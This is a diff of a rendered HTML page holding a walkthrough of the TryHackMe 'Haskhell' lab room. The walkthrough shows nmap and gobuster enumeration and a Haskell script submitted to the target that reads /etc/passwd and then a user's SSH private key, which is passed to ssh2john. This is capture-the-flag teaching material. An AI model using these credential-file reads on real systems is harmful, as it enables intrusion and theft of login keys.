@@ -1,4 +1,4 @@
-I"�<h2 id="description">Description:</h2>
+I"7<h2 id="description">Description:</h2>
 
 <p>The Following Post is writeup of Haskhell room of tryhackme <a href="https://tryhackme.com/room/haskhell">https://tryhackme.com/room/haskhell</a></p>
 
@@ -22,10 +22,6 @@
       <td style="text-align: left">Creator</td>
       <td style="text-align: left">sgtscout</td>
     </tr>
-    <tr>
-      <td style="text-align: left">Tech</td>
-      <td style="text-align: left">Haskell and Flask</td>
-    </tr>
   </tbody>
 </table>
 
@@ -41,7 +37,7 @@
 <h3 id="enumeration">Enumeration</h3>
 
 <p>Lets start with nmap scan</p>
-<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -55,7 +51,7 @@
 12
 13
 14
-</pre></td> --><td class="rouge-code"><pre><span class="gp">nmap -sC -sV &lt;ip&gt;</span><span class="w">
+</pre></td><td class="rouge-code"><pre><span class="gp">nmap -sC -sV &lt;ip&gt;</span><span class="w">
 </span><span class="go">PORT     STATE SERVICE VERSION
 </span><span class="gp">22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux;</span><span class="w"> </span>protocol 2.0<span class="o">)</span>
 <span class="go">| ssh-hostkey:
@@ -73,7 +69,7 @@ Nmap done: 1 IP address (1 host up) scanned in 31.91 seconds
 <p>We can see server at port 5001</p>
 
 <p>let’s dirbust it</p>
-<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -92,7 +88,7 @@ Nmap done: 1 IP address (1 host up) scanned in 31.91 seconds
 17
 18
 19
-</pre></td> --><td class="rouge-code"><pre><span class="go">┌─[✗]─[silver@parrot]─[~]
+</pre></td><td class="rouge-code"><pre><span class="go">┌─[✗]─[silver@parrot]─[~]
 </span><span class="gp">└──╼ $</span>gobuster <span class="nb">dir</span> <span class="nt">-w</span> /usr/share/wordlists/dirb/common.txt <span class="nt">-u</span> http://10.10.30.179:5001
 <span class="go">===============================================================
 Gobuster v3.0.1
@@ -116,11 +112,11 @@ by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
 <p>we got a submit dir let’s see what we can submit
 We need to make a haskell script to see if we can get any output or not</p>
 
-<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
-</pre></td> --><td class="rouge-code"><pre><span class="gp">└──╼ $</span><span class="nb">cat </span>try.hs
+</pre></td><td class="rouge-code"><pre><span class="gp">└──╼ $</span><span class="nb">cat </span>try.hs
 <span class="go">main = do
  x &lt;- readFile "/etc/passwd"
  putStr x
@@ -130,7 +126,7 @@ We need to make a haskell script to see if we can get any output or not</p>
 So we changed the readfile to /home/prof/.ssh/id_rsa</p>
 
 <p>we got key hurray crack using john</p>
-<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -151,7 +147,7 @@ So we changed the readfile to /home/prof/.ssh/id_rsa</p>
 19
 20
 21
-</pre></td> --><td class="rouge-code"><pre><span class="gp">└──╼ $</span>/usr/share/john/ssh2john.py id_rsa <span class="o">&gt;</span> crack.hash
+</pre></td><td class="rouge-code"><pre><span class="gp">└──╼ $</span>/usr/share/john/ssh2john.py id_rsa <span class="o">&gt;</span> crack.hash
 <span class="go">id_rsa has no password!
 
 
